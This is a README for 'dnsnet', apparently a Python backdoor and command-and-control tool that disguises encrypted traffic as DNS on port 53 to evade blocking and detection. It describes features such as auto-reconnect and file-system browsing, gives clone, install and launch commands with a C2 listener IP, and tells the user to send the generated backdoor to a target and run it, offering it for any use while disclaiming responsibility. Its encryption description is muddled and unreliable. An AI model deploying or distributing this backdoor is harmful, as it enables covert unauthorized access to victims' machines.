# dnsnet


# Current Version: ReleaseV1

![box](https://user-images.githubusercontent.com/72181445/155982020-2db1333f-74b7-4c3f-8178-f14a75a0a65d.png)

# Description:
DNSNET masks itself as DNS traffic by communicating through the port 53. On top of it making the traffic less easy to spot, 
it will make dealing with the backdoor alot harder since a company of course cannot block the port and good luck figuring 
out which one of the 999999999 programs that also use the 53 port is the right one. The traffic is also encrypted so that's nice I guess.

# Disclaimer:
Im not responsible for any damage or harm done by this program in the hands of other people.

# Where is this used?:
I originally started coding this because I wanted a sure way to stealth backdoor victim machine during a red team/pen test assesments however
you can use it however you want (I'm not responsible for your actions).

# Update log:
Alpha: 10 times encryption and stabile server end

AlphaV2: Automatic reconnect if connection is lost and manual reset added by pressing ctrl + c on the server end, cryptography import problems solved

BetaV1: Backdoor now remembers where you cd'ed to allowing much better file system exploring, overall small fixes to make the backdoor more stable and usable

ReleaseV1: Complete redesign, coded from the ground up

# In development?: yes

# How to use (REPLACE "Listener ip" with the c2 ip):
```
git clone https://github.com/R00tendo/dnsnet
cd dnsnet
pip3 install -r requirements.txt
python3 dnsnet.py --li Listener ip
```
then send the generated backdoor file to the target and execute it.

# Technical Details:
Encryption: Fernet 32bit encryption (that times the keys)
Program: Python3
  

